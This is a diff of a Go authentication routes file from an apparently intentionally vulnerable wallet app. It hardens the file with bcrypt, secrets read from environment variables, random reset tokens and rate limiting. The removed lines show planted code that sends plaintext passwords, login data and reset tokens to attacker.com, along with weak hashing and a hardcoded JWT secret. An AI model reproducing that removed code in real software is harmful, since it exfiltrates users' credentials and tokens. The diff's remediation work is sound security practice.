@@ -1,13 +1,11 @@
 package routes
 
 import (
-	"crypto/md5"
-	"crypto/sha1"
-	"encoding/base64"
-	"encoding/hex"
-	"encoding/json"
+	"crypto/rand"
 	"fmt"
 	"net/http"
+	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -16,26 +14,28 @@ import (
 	"securewallet/internal/models"
 	"securewallet/internal/services"
 
+	"golang.org/x/crypto/bcrypt"
+
 	"github.com/gin-gonic/gin"
 	"github.com/golang-jwt/jwt/v5"
 )
 
 // Global storage for second-order attacks
 var secondOrderStorage = make(map[string]map[string]string)
-var oobCallbacks []map[string]interface{}
 
 // SetupAuthRoutes sets up authentication routes
 func SetupAuthRoutes(router *gin.RouterGroup) {
 	auth := router.Group("/auth")
 	{
-		auth.POST("/register", register)
-		auth.POST("/login", login)
-		auth.POST("/login/2fa", login2FA)
+		// SECURE: Add rate limiting to sensitive endpoints
+		auth.POST("/register", middleware.RateLimitMiddleware(), register)
+		auth.POST("/login", middleware.RateLimitMiddleware(), login)
+		auth.POST("/login/2fa", middleware.RateLimitMiddleware(), login2FA)
 		auth.POST("/logout", logout)
 		auth.GET("/me", middleware.AuthMiddleware(), getCurrentUser)
 		auth.POST("/refresh", refreshToken)
-		auth.POST("/password-reset", passwordReset)
-		auth.POST("/callback", oobCallback)
+		auth.POST("/password-reset", middleware.RateLimitMiddleware(), passwordReset)
+		auth.POST("/password-verify", middleware.RateLimitMiddleware(), passwordVerify)
 	}
 }
 
@@ -83,31 +83,26 @@ func register(c *gin.Context) {
 		return
 	}
 
-	// VULNERABILITY: Multiple weak password storage methods for testing
-	// Store password in multiple formats for second-order attacks
-	passwordHash := base64.StdEncoding.EncodeToString([]byte(userData.Password))
-
-	// Store additional formats for second-order attacks
-	md5Hash := md5.Sum([]byte(userData.Password))
-	sha1Hash := sha1.Sum([]byte(userData.Password))
-	secondOrderStorage[userData.Username] = map[string]string{
-		"md5":   hex.EncodeToString(md5Hash[:]),
-		"sha1":  hex.EncodeToString(sha1Hash[:]),
-		"plain": userData.Password,
+	// SECURE: Use bcrypt for password hashing
+	passwordHash, err := bcrypt.GenerateFromPassword([]byte(userData.Password), bcrypt.DefaultCost)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to hash password"})
+		return
 	}
-
-	// OOB attack - send password to external server
-	go func() {
-		http.Post("http://attacker.com/collect", "application/json", strings.NewReader(fmt.Sprintf(`{"username":"%s","password":"%s"}`, userData.Username, userData.Password)))
-	}()
 
 	// Create new user
 	user := models.User{
 		Username:     userData.Username,
 		Email:        userData.Email,
-		PasswordHash: passwordHash,
+		PasswordHash: string(passwordHash),
 		IsActive:     true,
 		IsAdmin:      false,
+	}
+
+	// Enforce strong password policy at registration
+	if !isStrongPassword(userData.Password) {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Password must be at least 12 chars, include upper, lower, number, special"})
+		return
 	}
 
 	if err := db.Create(&user).Error; err != nil {
@@ -149,19 +144,8 @@ func login(c *gin.Context) {
 		return
 	}
 
-	// Multiple authentication methods
-	userID := user.ID
-	salt := fmt.Sprintf("user_%d_salt", userID)
-	sha1Hash := sha1.Sum([]byte(userCredentials.Password + salt))
-	inputHash := hex.EncodeToString(sha1Hash[:])
-
-	// Normal authentication (bypass techniques temporarily disabled)
-	if user.PasswordHash == inputHash {
-		// Authentication successful
-		// Record successful login attempt
-		loginHistoryService := services.NewLoginHistoryService()
-		loginHistoryService.RecordLoginAttempt(user.ID, "success", c.Request)
-	} else {
+	// SECURE: Use bcrypt for password verification
+	if err := bcrypt.CompareHashAndPassword([]byte(user.PasswordHash), []byte(userCredentials.Password)); err != nil {
 		// Record failed login attempt
 		loginHistoryService := services.NewLoginHistoryService()
 		loginHistoryService.RecordLoginAttempt(user.ID, "failed", c.Request)
@@ -169,6 +153,11 @@ func login(c *gin.Context) {
 		c.JSON(http.StatusUnauthorized, gin.H{"error": "Incorrect username or password"})
 		return
 	}
+
+	// Authentication successful
+	// Record successful login attempt
+	loginHistoryService := services.NewLoginHistoryService()
+	loginHistoryService.RecordLoginAttempt(user.ID, "success", c.Request)
 
 	if !user.IsActive {
 		c.JSON(http.StatusUnauthorized, gin.H{"error": "User account is disabled"})
@@ -185,27 +174,13 @@ func login(c *gin.Context) {
 		return
 	}
 
-	// VULNERABILITY: Weak JWT with multiple vulnerabilities
-	jwtSecret := "expert_secret_key_789"
-	expireMinutes := 525600 // 1 year
-
-	// OOB JWT validation
-	go func() {
-		data := map[string]interface{}{
-			"username":  userCredentials.Username,
-			"user_id":   user.ID,
-			"timestamp": time.Now().Unix(),
-		}
-		jsonData, _ := json.Marshal(data)
-		http.Post("http://attacker.com/jwt_validate", "application/json", strings.NewReader(string(jsonData)))
-	}()
-
-	// Second-order JWT secret
-	if stored, exists := secondOrderStorage[userCredentials.Username]; exists {
-		if secret, ok := stored["jwt_secret"]; ok {
-			jwtSecret = secret
-		}
+	// SECURE: Use environment variable for JWT secret and reasonable expiration
+	jwtSecret := os.Getenv("JWT_SECRET")
+	if jwtSecret == "" {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "JWT secret not configured"})
+		return
 	}
+	expireMinutes := 60 // 1 hour - reasonable expiration time
 
 	// Create access token with vulnerability-specific settings
 	claims := jwt.MapClaims{
@@ -271,9 +246,13 @@ func login2FA(c *gin.Context) {
 	loginHistoryService := services.NewLoginHistoryService()
 	loginHistoryService.RecordLoginAttempt(user.ID, "success", c.Request)
 
-	// Create JWT token
-	jwtSecret := "expert_secret_key_789"
-	expireMinutes := 525600 // 1 year
+	// SECURE: Create JWT token with environment variable and reasonable expiration
+	jwtSecret := os.Getenv("JWT_SECRET")
+	if jwtSecret == "" {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "JWT secret not configured"})
+		return
+	}
+	expireMinutes := 60 // 1 hour - reasonable expiration time
 
 	claims := jwt.MapClaims{
 		"sub": user.Username,
@@ -336,39 +315,62 @@ func refreshToken(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"message": "Token refreshed"})
 }
 
+// @Summary Reset password
+// @Description Reset password for a user
+// @Tags auth
+// @Accept json
+// @Produce json
+// @Param email body PasswordResetRequest true "Email for password reset"
+// @Success 200 {object} gin.H
+// @Failure 400 {object} gin.H
+// @Router /auth/password-reset [post]
 // passwordReset handles password reset
 func passwordReset(c *gin.Context) {
 	email := c.PostForm("email")
+	// In passwordReset: prefer JSON body if form empty
 	if email == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Email is required"})
+		var body struct {
+			Email string `json:"email"`
+		}
+		if err := c.ShouldBindJSON(&body); err == nil && body.Email != "" {
+			email = body.Email
+		} else {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "Email is required"})
+			return
+		}
+	}
+
+	// SECURE: Validate email format
+	if !strings.Contains(email, "@") || len(email) > 100 {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid email format"})
 		return
 	}
 
 	db := config.GetDB()
 
-	// VULNERABILITY: Advanced password reset with OOB and second-order attacks
+	// SECURE: Check if user exists and generate secure reset token
 	var user models.User
 	if err := db.Where("email = ?", email).First(&user).Error; err == nil {
-		// Complex token generation with multiple vulnerabilities
-		resetToken := base64.StdEncoding.EncodeToString([]byte(email + fmt.Sprintf("%d", time.Now().Unix())))
+		// Generate cryptographically secure random token
+		tokenBytes := make([]byte, 32)
+		if _, err := rand.Read(tokenBytes); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate reset token"})
+			return
+		}
+		resetToken := fmt.Sprintf("%x", tokenBytes)
 
-		// OOB attack - multiple endpoints
-		go func() {
-			data := map[string]string{
-				"email": email,
-				"token": resetToken,
+		// Store token in Redis with 24h expiration; fallback to memory
+		if rdb := config.GetRedis(); rdb != nil {
+			key := fmt.Sprintf("password_reset:%s", resetToken)
+			if err := rdb.Set(c.Request.Context(), key, fmt.Sprintf("%d", user.ID), 24*time.Hour).Err(); err != nil {
+				c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to store reset token"})
+				return
 			}
-			jsonData, _ := json.Marshal(data)
-			http.Post("http://attacker.com/reset_token", "application/json", strings.NewReader(string(jsonData)))
-			http.Get(fmt.Sprintf("http://attacker.com/callback?email=%s&token=%s", email, resetToken))
-		}()
-
-		// Second-order attack - store in multiple formats
-		md5Hash := md5.Sum([]byte(resetToken))
-		secondOrderStorage[email] = map[string]string{
-			"reset_token": resetToken,
-			"md5_token":   hex.EncodeToString(md5Hash[:]),
-			"timestamp":   fmt.Sprintf("%d", time.Now().Unix()),
+		} else {
+			secondOrderStorage[email] = map[string]string{
+				"reset_token": resetToken,
+				"timestamp":   fmt.Sprintf("%d", time.Now().Unix()),
+			}
 		}
 
 		c.JSON(http.StatusOK, gin.H{"message": "Reset link sent"})
@@ -378,19 +380,105 @@ func passwordReset(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"message": "If email exists, reset link will be sent"})
 }
 
-// oobCallback handles OOB callback endpoint for advanced attacks
-func oobCallback(c *gin.Context) {
-	var data map[string]interface{}
-	if err := c.ShouldBindJSON(&data); err != nil {
+// PasswordVerifyRequest represents password verification request data
+type PasswordVerifyRequest struct {
+	Email       string `json:"email" binding:"required"`
+	Token       string `json:"token" binding:"required"`
+	NewPassword string `json:"new_password" binding:"required,min=8"`
+}
+
+// passwordVerify handles password reset verification and password change
+func passwordVerify(c *gin.Context) {
+	var req PasswordVerifyRequest
+	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
 
-	// Store OOB data for second-order attacks
-	oobCallbacks = append(oobCallbacks, map[string]interface{}{
-		"timestamp": time.Now().Unix(),
-		"data":      data,
-	})
+	db := config.GetDB()
 
-	c.JSON(http.StatusOK, gin.H{"status": "callback received"})
+	// SECURE: Validate token securely
+	var user models.User
+	if err := db.Where("email = ?", req.Email).First(&user).Error; err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid email or token"})
+		return
+	}
+
+	// Validate token with Redis first, then fallback
+	valid := false
+	if rdb := config.GetRedis(); rdb != nil {
+		key := fmt.Sprintf("password_reset:%s", req.Token)
+		val, err := rdb.Get(c.Request.Context(), key).Result()
+		if err == nil && val == fmt.Sprintf("%d", user.ID) {
+			valid = true
+			rdb.Del(c.Request.Context(), key)
+		}
+	}
+	if !valid {
+		if storedData, exists := secondOrderStorage[req.Email]; exists {
+			timestampStr := storedData["timestamp"]
+			if timestampStr != "" {
+				if unixTime, err := strconv.ParseInt(timestampStr, 10, 64); err == nil {
+					timestamp := time.Unix(unixTime, 0)
+					if time.Since(timestamp) <= 24*time.Hour && storedData["reset_token"] == req.Token {
+						valid = true
+						delete(secondOrderStorage, req.Email)
+					}
+				}
+			}
+		}
+	}
+	if !valid {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid or expired token"})
+		return
+	}
+
+	// Enforce strong password policy in reset verify
+	if !isStrongPassword(req.NewPassword) {
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Password must be at least 12 chars, include upper, lower, number, special"})
+		return
+	}
+
+	// SECURE: Update user password with bcrypt hashing
+	passwordHash, err := bcrypt.GenerateFromPassword([]byte(req.NewPassword), bcrypt.DefaultCost)
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to hash password"})
+		return
+	}
+
+	// Update user password in database
+	if err := db.Model(&user).Update("password_hash", passwordHash).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to update password"})
+		return
+	}
+
+	// Clear reset token from storage
+	delete(secondOrderStorage[req.Email], "reset_token")
+	delete(secondOrderStorage[req.Email], "timestamp")
+
+	// SECURE: Return minimal information
+	c.JSON(http.StatusOK, gin.H{
+		"message": "Password successfully updated",
+	})
+}
+
+// helper: strong password checker
+func isStrongPassword(pw string) bool {
+	if len(pw) < 12 {
+		return false
+	}
+	hasU, hasL, hasD, hasS := false, false, false, false
+	for _, ch := range pw {
+		switch {
+		case ch >= 'A' && ch <= 'Z':
+			hasU = true
+		case ch >= 'a' && ch <= 'z':
+			hasL = true
+		case ch >= '0' && ch <= '9':
+			hasD = true
+		default:
+			hasS = true
+		}
+	}
+	return hasU && hasL && hasD && hasS
 }
